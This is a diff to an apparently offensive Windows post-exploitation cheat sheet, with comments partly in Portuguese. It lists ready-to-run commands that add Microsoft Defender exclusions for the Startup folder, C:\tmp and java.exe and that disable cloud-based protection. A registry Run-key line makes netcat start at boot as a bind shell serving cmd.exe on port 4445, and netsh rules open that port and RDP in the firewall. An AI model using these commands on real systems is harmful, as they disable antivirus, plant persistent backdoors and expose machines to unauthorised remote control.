@@ -1,5 +1,12 @@
+## Win AV 
+
 Set-MpPreference -ExclusionPath 'C:\Users\USERNAME\appdata\roaming\microsoft\windows\start menu\programs\startup' //Set an exclusion path or file.
 Set-MpPreference -ExclusionPath 'C:\%homepath%\appdata\roaming\microsoft\windows\start menu\programs\startup' //Set an exclusion path or file.
+powershell -Command Add-MpPreference -ExclusionPath "C:\tmp"
+powershell -Command Add-MpPreference -ExclusionProcess "java.exe"
+powershell -Command Add-MpPreference -ExclusionExtension ".java"
+
+powershell -Command Remove-MpPreference -ExclusionExtension ".java"
 
 Get-Command -Module Defender //List commands.
 
@@ -16,6 +23,10 @@ Enable-NetFirewallRule -DisplayGroup "Área de Trabalho Remota" //ADD firewall r
 
 Set-MpPreference -MAPSReporting 0 ​//Disable cloud-based protection.
 
+
+
+## Reg, Fir, netsh & netuser
+
 reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v netcat -d 'C:\windows\system32\nc.exe -Ldp 4445 -e cmd.exe' //Adiciona uma regra para o nc abrir a porta 4445.
 
 netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445 //Adiciona uma regra de firewall para liberar a porta 4445 para o nc.
@@ -24,7 +35,7 @@ netsh firewall show portopening //Lista as portas liberadas pelo firewall.
 
 netsh advfirewall firewall add rule name="rdp" protocol=TCP dir=in localport=3389 action=allow //Cria uma regra de firewall para a porta 3389 RDP
 
-## Criar usuário
+## Create user
 
 net user Administrator //Mostra as informações desse usuário.
 
